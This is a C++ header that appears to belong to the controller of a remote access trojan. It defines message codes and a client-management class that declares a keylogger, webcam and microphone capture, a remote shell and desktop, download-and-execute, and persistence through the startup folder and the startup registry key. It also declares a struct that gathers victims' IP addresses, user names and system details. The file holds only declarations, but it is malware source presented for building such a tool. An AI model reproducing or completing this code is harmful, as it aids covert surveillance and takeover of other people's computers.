#pragma once
#include "MsgHandler.h"
	

#define KNEL	('K'|('N'<<8)|('E'<<16)|('L'<<24))



#define KNEL_LOGIN (0xee01)
//
#define KNEL_READY			(0x4552)

#define KNEL_POWER_REBOOT	(0xee02)
#define KNEL_POWER_SHUTDOWN	(0xee03)
#define KNEL_RESTART		(0xea04)


#define KNEL_EDITCOMMENT	(0xee04)
#define KNEL_EDITCOMMENT_OK	(0xee05)

#define KNEL_UPLOAD_MODULE_FROMDISK		(0xee08)
#define KNEL_UPLOAD_MODULE_FORMURL		(0xee09)



#define KNEL_ERROR			(0xea08)


#define KNEL_MODULE_BUSY				(0xdd00)
#define KNEL_CMD						(0xdd01)
#define KNEL_CHAT						(0xdd02)
#define KNEL_FILEMGR					(0xdd03)
#define KNEL_DESKTOP					(0xdd04)
#define KNEL_CAMERA						(0xdd05)
#define KNEL_MICROPHONE					(0xdd06)
#define KNEL_DOWNANDEXEC				(0xdd07)
#define KNEL_EXIT						(0xdd08)
#define KNEL_KEYBD_LOG					(0xdd09)

#define KNEL_UTILS_COPYTOSTARTUP		(0xdd0a)
#define KNEL_UTILS_WRITE_REG			(0xdd0b)


//获取模块信息....
#define KNEL_GETMODULE_INFO	(0xea05)
#define KNEL_MODULE_INFO	(0xea07)

#define KNEL_MODULE_CHUNK_GET	(0xfa00)
#define KNEL_MODULE_CHUNK_DAT	(0xfa01)


class CUpModuleDlg;

class CKernelSrv :
	public CMsgHandler
{
public:
	typedef struct LoginInfo
	{
		TCHAR szPrivateIP[128];				//
		TCHAR szHostName[128];
		TCHAR szUser[128];
		TCHAR szOsName[128];
		TCHAR szInstallDate[128];
		TCHAR szCPU[128];
		TCHAR szDisk_RAM[128];
		DWORD dwHasCamera;
		DWORD dwPing;
		TCHAR szComment[256];

	}LoginInfo;
	
private:

	HWND m_hClientList;
	CUpModuleDlg*m_UpDlg;


	void OnClose() ;	
	void OnOpen();		


	void OnReadMsg(WORD Msg, DWORD dwSize, char*Buffer);
	void OnWriteMsg(WORD Msg, DWORD dwSize, char*Buffer) {};


	void OnLogin(LoginInfo *pLi);

	CString getIPLocation(const CString & ip_address);
	void OnGetModuleInfo(const char*ModuleName);
	void OnGetModuleChunk(char * ChunkInfo);


public:
	CString GetLocation();;

	void EditComment(TCHAR *Comment);
	void Power_Reboot();
	void Power_Shutdown();
	void Restart();

	void OnError(TCHAR * Error);
	void UploadModuleFromDisk(TCHAR* Path);
	void UploadModuleFromUrl(TCHAR* Url);

	void BeginCmd();
	void BeginChat();
	void BeginFileMgr();
	void BeginRemoteDesktop();
	void BeginCamera();
	void BeginMicrophone();
	void BeginDownloadAndExec(TCHAR szUrl[]);
	void BeginExit();
	void BeginKeyboardLog();

	void UtilsWriteStartupReg();
	void UtilsCopyToStartupMenu();
	//----------------------------------------------
	CKernelSrv(HWND hClientList, CManager*pManager);
	~CKernelSrv();
};

